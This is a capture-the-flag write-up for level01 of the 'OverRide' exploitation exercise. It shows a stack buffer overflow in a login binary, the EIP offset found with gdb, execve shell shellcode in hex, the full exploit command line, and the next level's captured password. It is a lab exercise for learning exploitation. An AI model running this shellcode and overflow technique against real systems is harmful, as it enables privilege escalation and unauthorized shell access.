# Level01

This binary ask for a username that it will read from stdin. The input will then be sent to verify_user_name, I don't think it's necessary to explain its purpose. If the username is valid (dat_wil), it will then ask for a password from stdin, call veryfy_user_pass, and print "incorrect password" in any case. So finding the password will be of no use (but I did it nevertheless because I'm an idiot who doesn't read the source code, it's "admin").

Anyway, the initial guess was that we could overflow memcmp used in the verify functions. So the first step was to find which registers we could overflow, and the offset. Since the password was useless anyway, we figured out that we would try with this one first:

    (gdb) r
    Starting program: /home/users/level01/level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password: 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    nope, incorrect password...


    Program received signal SIGSEGV, Segmentation fault.
    0x37634136 in ?? ()
    (gdb) i r
    eax            0x1	1
    ecx            0xffffffff	-1
    edx            0xf7fd08b8	-134412104
    ebx            0x33634132	862142770
    esp            0xffffd710	0xffffd710
    ebp            0x63413563	0x63413563
    esi            0x0	0
    edi            0x41346341	1093952321
    eip            0x37634136	0x37634136  <-- offset 80
    eflags         0x10286	[ PF SF IF RF ]
    cs             0x23	35
    ss             0x2b	43
    ds             0x2b	43
    es             0x2b	43
    fs             0x0	0
    gs             0x63	99

Great, we can overflow EIP. So we can use our now favorite technique of passing a shellcode to an env variable, finding its address and passing it to EIP. The shellcode used here is the one I crafted for the level2 of the previous project [rainfall](https://github.com/SERAC-SGM/rainfall-42/tree/main/level02)

    level01@OverRide:~$ export PAYLOAD=$(python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')

    (gdb) b main
    Breakpoint 1 at 0x80484d5
    (gdb) r
    Starting program: /home/users/level01/level01 

    Breakpoint 1, 0x080484d5 in main ()
    (gdb) x/500s $esp
    [...]
    0xffffdf3e:	 "SSH_CONNECTION=192.168.56.1 44688 192.168.56.103 4242"
    0xffffdf74:	 "LESSOPEN=| /usr/bin/lesspipe %s"
    0xffffdf94:	 "PAYLOAD=1\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"
    0xffffdfba:	 "LESSCLOSE=/usr/bin/lesspipe %s %s"
    0xffffdfdc:	 "/home/users/level01/level01"
    [...]

We get the address at 0xffffdf94. We need to remote the PAYLOAD= tho, so the real address used will be 0xffffdf9c.

    level01@OverRide:~$ (python -c  'print "dat_wil"'; python -c 'print "Y" * 80 + "\x9c\xdf\xff\xff"'; cat) | ./level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: verifying username....

    Enter Password: 
    nope, incorrect password...

    id
    uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
    cd ../level02
    cat .pass
    PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
